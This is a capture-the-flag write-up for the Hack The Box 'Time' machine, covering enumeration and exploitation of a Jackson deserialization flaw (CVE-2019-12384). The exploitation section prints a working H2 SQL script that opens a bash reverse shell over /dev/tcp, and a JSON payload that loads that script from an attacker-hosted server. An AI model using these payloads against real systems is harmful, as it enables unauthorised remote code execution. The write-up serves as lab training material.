---
title: "Time HTB Writeup"
date: 2021-03-26T4:42:47+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
]
---
![Machine info](/images/time/1.png)

Time is a medium machine retired today, but i think it's an easy and straight forward one. enjoy .. 

### 1. Enumeration:
* Nmap scan:
  * `` nmap -sC -sV 10.10.10.214`` 
![](/images/time/2.png)

* Web Enumeration:
  * let's check out the running web server:
![it's a java beautifier and validator](/images/time/3.png)

* And the source code:
![](/images/time/4.png)
Nothing interesting in the source code.

* let's search for hidden directories:
```yml
$ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar
```
![](/images/time/5.png)
![](/images/time/6.png)

* Nothing useful inside them:
![error like this apache version we shall search for exploits for it if any](/images/time/7.png)
also checking ``/index.php and /index.php/login`` >> gives nothing useful and redirects back to the main page

### Let's see the app functionality:
* when tried the beautifier > it worked fine
* when tried validator (still in beta version) >> tried some meaningless letters
  * gave some suspicious error >> will search with it to see its meaning.

```text
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'edfgagshh': was expecting ('true', 'false' or 'null')
```
![](/images/time/8.png)

* Found out that this ``com.fasterxml.jackson.core`` library is vulnerable and leads to RCE.
![](/images/time/9.png)

* Found an exploit for it on github [here](https://github.com/jas502n/CVE-2019-12384)
![](/images/time/10.png)
![](/images/time/11.png)

To understand the error [more](https://stackoverflow.com/questions/49822202/com-fasterxml-jackson-databind-exc-mismatchedinputexception-unexpected-token-s)
![](/images/time/12.png)

### Exploitation:
This is where the deserialization comes in. You need to find the right class for the application to accept. This is where CVE-2019-12384 comes in. Now that we understand how to construct a correct payload, we can abuse it for a shell. Looking over the github, we see that we are using this class: ch.qos.logback.core.db.DriverManagerConnectionSource.

So now all we gotta do is host the "inject.sql" on our webserver, modify the "inject.sql" to execute the code we want (rev shell of course), and to send the application the payload it expects. Breakdown below

1. Setup your http server to host the malicious content. There's a python script called 'updog' (pip3 install updog) that I like to use. It's quicker than the stupid python3 -m http.server. Fuck typing

2. Create file 'inject.sql' to host on your http server and insert the following code into it:
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &')


3. Replace the IP and PORT above with your HTB IP and netcat listener port

4. Start your netcat listener

5. On the website application, select "Validate (beta!)" and input this: 
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://IP:PORT/inject.sql'"}]


6. Replace IP with your HTB IP, and PORT with your server port (updog uses 9090)

7. Submit and you should get a shell.
8. 








